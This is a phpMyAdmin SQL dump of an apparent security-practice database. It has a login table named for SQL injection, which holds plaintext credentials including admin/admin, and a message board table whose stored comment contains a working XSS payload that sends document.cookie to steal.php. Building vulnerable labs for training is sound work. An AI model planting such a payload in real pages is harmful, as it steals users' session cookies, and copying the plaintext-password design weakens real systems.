-- phpMyAdmin SQL Dump
-- version 3.0.0
-- http://www.phpmyadmin.net
--
-- 主机: localhost
-- 生成日期: 2010 年 06 月 30 日 19:56
-- 服务器版本: 5.0.77
-- PHP 版本: 5.2.6

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- 数据库: `security`
--

-- --------------------------------------------------------

--
-- 表的结构 `injection_login`
--

CREATE TABLE IF NOT EXISTS `injection_login` (
  `id` int(6) NOT NULL auto_increment,
  `username` varchar(64) NOT NULL,
  `password` varchar(32) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- 导出表中的数据 `injection_login`
--

INSERT INTO `injection_login` (`id`, `username`, `password`) VALUES
(1, '2', '22'),
(2, 'admin', 'admin');

-- --------------------------------------------------------

--
-- 表的结构 `xss_bbs`
--

CREATE TABLE IF NOT EXISTS `xss_bbs` (
  `id` int(6) NOT NULL auto_increment,
  `name` varchar(64) NOT NULL,
  `comment` text NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=5 ;

--
-- 导出表中的数据 `xss_bbs`
--

INSERT INTO `xss_bbs` (`id`, `name`, `comment`) VALUES
(4, 'himan', 'hi sweet ^_^<script>document.write(''<img width=0 height=0 src=steal.php?cookies=''+document.cookie+'' />'');</script>');
